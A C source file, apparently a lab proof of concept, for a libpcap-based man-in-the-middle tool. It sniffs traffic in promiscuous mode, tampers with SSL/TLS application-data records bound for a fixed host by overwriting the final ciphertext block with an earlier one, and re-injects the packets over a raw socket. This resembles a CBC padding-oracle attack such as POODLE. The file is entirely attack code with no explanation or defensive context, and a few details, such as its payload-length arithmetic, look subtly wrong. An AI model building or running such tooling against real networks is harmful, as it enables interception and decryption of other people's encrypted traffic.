#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "sniff.h"

static int Compteur = 0;

int tab2octet(u_char tab[], int size)
{
  int i,j;
  int res = 0, bit = 0;
  for (i=0; i<size ; i++)
    {
      for (j = 7; j >= 0; j--)
	{
	  bit = tab[i] & ((int)1<<j);
	  res = res | bit;
	}
      if (i != (size-1))
	res = res << 8;
    }
  return res;
}

void 
Replace_Last_Block(char* msg)
{
  int i;

  for(i=32; i<=39; i++)
    {
      msg[i+40] = msg[i];
    }

}

/***** Callback unction *****/
void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
  const struct sniff_ethernet *ethernet; /* The ethernet header */
  const struct sniff_ip *ip; /* The IP header */
  const struct sniff_tcp *tcp; /* The TCP header */
  const struct sniff_ssl *ssl; /* The SSL header */
  const char *payload; /* Packet payload */
  struct sockaddr_in sin;
  char datagram[4096];
  int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
  if(s == -1)
    {
      //socket creation failed, may be because of non-root privileges
      perror("Failed to create socket");
      exit(1);
    }

  memset (datagram, 0, 4096);

  u_int size_ip;
  u_int size_tcp;
  u_int size_ssl;

  ethernet = (struct sniff_ethernet*)(packet);
  ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
  size_ip = IP_HL(ip)*4;
  if (size_ip < 20) {
    printf("   * Invalid IP header length: %u bytes\n", size_ip);
    return;
  }
  
  tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
  size_tcp = TH_OFF(tcp)*4;
  if (size_tcp < 20) {
    printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
    return;
  }

  ssl = (struct sniff_ssl*)(packet + SIZE_ETHERNET + size_ip + size_tcp);
  size_ssl = 5;

  payload = (u_char*) (packet + SIZE_ETHERNET + size_ip + size_tcp + size_ssl);
  
  if(strcmp(inet_ntoa(ip->ip_dst),"172.16.0.2") == 0)
    {
      
      if( ssl->ssl_type == 0x17 && Compteur == 0)// && tab2octet(ssl->ssl_length, 2) != 24)
      	{
	  Compteur ++;
      	  Replace_Last_Block(payload + 29);
      	}

      printf("Compteur = %d\n", Compteur);
      
      sin.sin_family = AF_INET;
      sin.sin_port = tcp->th_dport;
      sin.sin_addr.s_addr = inet_addr("172.16.0.2");//inet_lnaof( ip->ip_dst);

      int size_payload = tab2octet(ip->ip_len,2) - size_tcp;
      memcpy(datagram, ip, size_ip);
      memcpy(datagram + size_ip, tcp, size_tcp);
      memcpy(datagram + size_ip + size_tcp, ssl, size_ssl);
      memcpy(datagram + size_ip + size_tcp + size_ssl, payload, size_payload);
       
      int msg_size;
   
      //IP_HDRINCL to tell the kernel that headers are included in the packet
      int one = 1;
      const int *val = &one;
     
      if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
	{
	  perror("Error setting IP_HDRINCL");
       
	}
      
      if( (msg_size = sendto(s, datagram, tab2octet(ip->ip_len,2), 0, (struct sockaddr *) &sin, sizeof(sin))) < 0)
	{
	  perror("sendto failed");
	}
      else
	{
	  printf ("Packet Send. Length : %d \n" , msg_size);
	}
      printf("\n");
    }

  //printf("Compteur = %d\n", Compteur);
  if(ssl->ssl_type == 0x15)
    printf("Alert SSL\n");
}



/*****       main       *****/
int main(int argc, char *argv[])
{
  char *dev;                    /* Device to sniff on */
  char errbuf[PCAP_ERRBUF_SIZE];/* Error string */
  pcap_t *handle;		/* Session handle */
  struct bpf_program fp;	/* The compiled filter expression */
  char filter_exp[] = "src 192.168.0.2 or src 172.16.0.2";/* The filter expression */
  bpf_u_int32 mask;		/* The netmask of our sniffing device */
  bpf_u_int32 net;		/* The IP of our sniffing device */
  u_char *packet;

  /* Define the device, eth0 will be taken by default */
  dev = pcap_lookupdev(errbuf);
  if (dev == NULL)
    {
      fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
      return(2);
    }
  printf("Device: %s\n", dev);

  /* Find the properties for the device */
  if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
    fprintf(stderr, "Can't get netmask for device %s\n", dev);
    net = 0;
    mask = 0;
  }

  /* Open the session in promiscuous mode */
  handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL)
    {
      fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
      return(2);
    }

  /* Compile and apply the filter */
  if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
    fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
    return(2);
  }

  if (pcap_setfilter(handle, &fp) == -1) {
    fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
    return(2);
  }

  if (pcap_loop(handle,-1,got_packet,packet)< 0)
    {
      fprintf(stderr,"pcap_loop : %s\n",pcap_geterr(handle));
      exit(-1);
    }
  
  /* And close the session */
  pcap_close(handle);
  
  return(0);
}
